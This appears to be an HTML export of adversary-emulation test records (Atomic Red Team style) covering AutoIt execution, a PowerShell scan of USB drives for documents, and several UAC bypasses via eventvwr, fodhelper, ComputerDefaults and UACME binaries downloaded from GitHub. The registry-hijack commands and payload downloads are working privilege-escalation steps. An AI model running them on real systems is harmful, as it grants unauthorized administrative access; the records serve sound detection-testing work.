<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a9b93f17-31cb-435d-a462-5e838a2a6026</li>
<li><strong>name</strong>: AutoIt Script Execution</li>
<li>
<p><strong>description</strong>: An adversary may attempt to execute suspicious or malicious script using AutoIt software instead of regular terminal like powershell or cmd. Calculator will popup when the script is executed successfully.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: Start-Process -FilePath "#{autoit_path}" -ArgumentList "#{script_path}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: if(Test-Path "#{autoit_path}") {
    exit 0
} else {
    exit 1
}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
$AutoItURL = "https://www.autoitscript.com/cgi-bin/getfile.pl?autoit3/autoit-v3-setup.exe"
$InstallerPath = "$PathToAtomicsFolder..\ExternalPayloads\autoit-v3-setup.exe"
Invoke-WebRequest -Uri $AutoItURL -OutFile $InstallerPath
Start-Process -FilePath $InstallerPath -ArgumentList "/S" -Wait</p>
</li>
<li>
<p><strong>cleanup_command</strong>: </p>
</li>
<li><strong>mitre_id</strong>: T1059</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: {'description': 'AutoIt Script Path', 'type': 'path', 'default': 'PathToAtomicsFolder\T1059\src\calc.au3'}</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: {'description': 'AutoIt Executable File Path', 'type': 'path', 'default': 'C:\Program Files (x86)\AutoIt3\AutoIt3.exe'}</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 0b29f7e3-a050-44b7-bf05-9fb86af1ec2e</li>
<li><strong>name</strong>: Identify Documents on USB and Removable Media via PowerShell</li>
<li>
<p><strong>description</strong>: This test simulates an attack where PowerShell is used to detect connected USB or other removable storage devices and gather a list of specific document files 
(e.g., .docx, .xls, .txt, .pdf). The command works by first identifying removable drives on the system and then recursively searching through each one for files 
matching the targeted extensions. If no removable drives are present, the script will return a message stating that no media is detected. This behavior mimics 
how adversaries might scan for sensitive documents on removable devices for exfiltration or analysis.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: powershell.exe -c "Get-Volume | Where-Object {$<em>.DriveType -eq 'Removable'} | ForEach-Object { Get-ChildItem -Path ($</em>.DriveLetter + ':*') -Recurse -Include '<em>.doc</em>','<em>.xls</em>','<em>.txt','</em>.pdf' -ErrorAction SilentlyContinue | ForEach-Object {Write-Output $<em>.FullName} } ; if (-not (Get-Volume | Where-Object {$</em>.DriveType -eq 'Removable'})) { Write-Output 'No removable media.' }"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li><strong>cleanup_command</strong>: </li>
<li><strong>mitre_id</strong>: T1025</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: a6ce9acf-842a-4af6-8f79-539be7608e2b</li>
<li><strong>name</strong>: Bypass UAC using Event Viewer (PowerShell)</li>
<li>
<p><strong>description</strong>: PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
Upon execution command prompt should be launched with administrative privalages</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-Item "HKCU:\software\classes\mscfile\shell\open\command" -Force
Set-ItemProperty "HKCU:\software\classes\mscfile\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\eventvwr.msc"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "HKCU:\software\classes\mscfile" -force -Recurse -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: {'description': 'Binary to execute with UAC Bypass', 'type': 'path', 'default': 'C:\Windows\System32\cmd.exe'}</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3f627297-6c38-4e7d-a278-fc2563eaaeaa</li>
<li><strong>name</strong>: Bypass UAC using Fodhelper - PowerShell</li>
<li>
<p><strong>description</strong>: PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.
Upon execution command prompt will be opened.</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: {'description': 'Binary to execute with UAC Bypass', 'type': 'path', 'default': 'C:\Windows\System32\cmd.exe'}</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 3c51abf2-44bf-42d8-9111-dc96ff66750f</li>
<li><strong>name</strong>: Bypass UAC using ComputerDefaults (PowerShell)</li>
<li>
<p><strong>description</strong>: PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10
Upon execution administrative command prompt should open</p>
</li>
<li>
<p><strong>platforms</strong>: ['windows']</p>
</li>
<li>
<p><strong>command</strong>: New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "#{executable_binary}" -Force
Start-Process "C:\Windows\System32\ComputerDefaults.exe"</p>
</li>
<li>
<p><strong>prereq_command</strong>: </p>
</li>
<li><strong>get_prereq_command</strong>: </li>
<li>
<p><strong>cleanup_command</strong>: Remove-Item "HKCU:\software\classes\ms-settings" -force -Recurse -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: {'description': 'Binary to execute with UAC Bypass', 'type': 'path', 'default': 'C:\Windows\System32\cmd.exe'}</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: None</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: 8ceab7a2-563a-47d2-b5ba-0995211128d7</li>
<li><strong>name</strong>: UACME Bypass Method 23</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: Leo Davidson derivative</p>
<p>Type:   Dll Hijack</p>
<p>Method: IFileOperation</p>
<p>Target: \system32\pkgmgr.exe</p>
<p>Component: DismCore.dll</p>
<p>Implementation: ucmDismMethod</p>
<p>UCM Method: UacMethodDISM</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
<li><strong>input_arguments.uacme_exe</strong>: {'description': 'Path to uacme executable', 'type': 'path', 'default': 'PathToAtomicsFolder\..\ExternalPayloads\uacme\23 Akagi64.exe'}</li>
<li><strong>input_arguments.commandpath</strong>: None</li>
<li><strong>input_arguments.commandtorun</strong>: None</li>
<li><strong>input_arguments.shortcut_file_path</strong>: None</li>
<li><strong>input_arguments.cloudtrail_name</strong>: None</li>
<li><strong>input_arguments.s3_bucket_name</strong>: None</li>
<li><strong>input_arguments.region</strong>: None</li>
<li><strong>input_arguments.username</strong>: None</li>
<li><strong>input_arguments.password</strong>: None</li>
<li><strong>input_arguments.event_hub_name</strong>: None</li>
<li><strong>input_arguments.resource_group</strong>: None</li>
<li><strong>input_arguments.name_space_name</strong>: None</li>
<li><strong>input_arguments.stratus_path</strong>: None</li>
<li><strong>input_arguments.aws_region</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_group_name</strong>: None</li>
<li><strong>input_arguments.cloudwatch_log_stream_name</strong>: None</li>
<li><strong>input_arguments.target_email</strong>: None</li>
<li><strong>input_arguments.project-id</strong>: None</li>
<li><strong>input_arguments.ms_product</strong>: None</li>
<li><strong>input_arguments.syslog_path</strong>: None</li>
<li><strong>input_arguments.macos_audit_path</strong>: None</li>
<li><strong>input_arguments.system_log_path</strong>: None</li>
<li><strong>input_arguments.system_log_name1</strong>: None</li>
<li><strong>input_arguments.system_log_name2</strong>: None</li>
<li><strong>input_arguments.system_log_name3</strong>: None</li>
<li><strong>input_arguments.system_log_folder</strong>: None</li>
<li><strong>input_arguments.journal_folder</strong>: None</li>
<li><strong>input_arguments.log_path</strong>: None</li>
<li><strong>input_arguments.1st_target_mailbox</strong>: None</li>
<li><strong>input_arguments.2nd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.3rd_target_mailbox</strong>: None</li>
<li><strong>input_arguments.ticket</strong>: None</li>
<li><strong>input_arguments.mimikatz_exe</strong>: None</li>
<li><strong>input_arguments.target</strong>: None</li>
<li><strong>input_arguments.user_name</strong>: None</li>
<li><strong>input_arguments.domain</strong>: None</li>
<li><strong>input_arguments.rubeus_url</strong>: None</li>
<li><strong>input_arguments.history_path</strong>: None</li>
<li><strong>input_arguments.dest_path</strong>: None</li>
<li><strong>input_arguments.package_checker</strong>: None</li>
<li><strong>input_arguments.package_installer</strong>: None</li>
<li><strong>input_arguments.flavor_command</strong>: None</li>
<li><strong>input_arguments.cleanup_command</strong>: None</li>
<li><strong>input_arguments.falcond_plist</strong>: None</li>
<li><strong>input_arguments.userdaemon_plist</strong>: None</li>
</ul>
<h2>Resultado</h2>
<ul>
<li><strong>id</strong>: b0f76240-9f33-4d34-90e8-3a7d501beb15</li>
<li><strong>name</strong>: UACME Bypass Method 31</li>
<li><strong>description</strong>: Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.
Note: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.</li>
</ul>
<p>Author: Enigma0x3</p>
<p>Type:   Shell API</p>
<p>Method: Registry key manipulation</p>
<p>Target: \system32\sdclt.exe</p>
<p>Component: Attacker defined</p>
<p>Implementation: ucmSdcltIsolatedCommandMethod</p>
<p>UCM Method: UacMethodShellSdclt</p>
<p>https://github.com/hfiref0x/UACME</p>
<ul>
<li><strong>platforms</strong>: ['windows']</li>
<li>
<p><strong>command</strong>: "#{uacme_exe}"</p>
</li>
<li>
<p><strong>prereq_command</strong>: $tempPath = cmd /c echo #{uacme_exe}
if (Test-Path "$tempPath") {exit 0} else {exit 1}</p>
</li>
<li>
<p><strong>get_prereq_command</strong>: New-Item -Type Directory "PathToAtomicsFolder..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1548.002/bin/uacme.zip" -OutFile "PathToAtomicsFolder..\ExternalPayloads\uacme.zip"
Expand-Archive "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" "PathToAtomicsFolder..\ExternalPayloads\uacme" -Force
Remove-Item "PathToAtomicsFolder..\ExternalPayloads\uacme.zip" -Force</p>
</li>
<li>
<p><strong>cleanup_command</strong>: powershell Stop-Process -Name cmd -Force -ErrorAction Ignore
powershell Stop-Process -Name mmc -Force -ErrorAction Ignore</p>
</li>
<li>
<p><strong>mitre_id</strong>: T1548.002</p>
</li>
<li><strong>input_arguments.output_file</strong>: None</li>
<li><strong>input_arguments.script_path</strong>: None</li>
<li><strong>input_arguments.python_script</strong>: None</li>
<li><strong>input_arguments.pid_term</strong>: None</li>
<li><strong>input_arguments.MimiPenguin_Location</strong>: None</li>
<li><strong>input_arguments.autoit_path</strong>: None</li>
<li><strong>input_arguments.server_ip</strong>: None</li>
<li><strong>input_arguments.client_path</strong>: None</li>
<li><strong>input_arguments.server_port</strong>: None</li>
<li><strong>input_arguments.file_to_pad</strong>: None</li>
<li><strong>input_arguments.executable_binary</strong>: None</li>
<li><strong>input_arguments.command_to_execute</strong>: None</li>
<li><strong>input_arguments.file_path</strong>: None</li>
